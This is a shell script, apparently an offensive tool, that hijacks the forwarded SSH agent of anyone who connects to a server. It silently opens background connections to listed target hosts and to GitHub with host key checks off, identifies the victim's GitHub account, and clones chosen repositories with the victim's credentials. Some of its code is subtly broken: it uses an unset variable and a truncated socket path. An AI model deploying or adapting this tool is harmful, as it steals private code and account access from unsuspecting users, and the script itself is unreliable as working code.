#!/bin/sh

if [ "$#" -eq 0 ]; then
  TARGETS_FILE="/etc/sshim/targets"
  DIR="/tmp/sshim/$(echo $SSH_CONNECTION | cut -d' ' -f1)"
  DIR="$DIR/$(ls $DIR 2>/dev/null | wc -l)"
  mkdir -p "$DIR"

  while IFS= read -r TARGET; do
    ssh -f -N -M -S "$DIR/$TARGET.sock" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$TARGET" >/dev/null 2>&1
  done < "$TARGETS_FILE"

  ssh -f -N -M -S "$DIR/github.sock" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@github.com >/dev/null 2>&1
  nohup $0 "$DIR" >/dev/null 2>&1 &
  exit
else
  ssh -T -S "$1/github.sock" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@github.com 2>&1 | grep -oE 'Hi [^!]+' | sed 's/Hi //' > "$DIR/username"
  REPOS_FILE="/etc/sshim/repos"
  REPO_DIR="/var/opt/sshim/"

  while IFS= read -r REPO; do
    GIT_SSH_COMMAND="ssh -S $DIR/github." git clone ssh://git@github.com/$REPO "$REPO_DIR$(echo $REPO | cut -d'/' -f2)" >/dev/null 2>&1
  done < "$REPOS_FILE"
fi
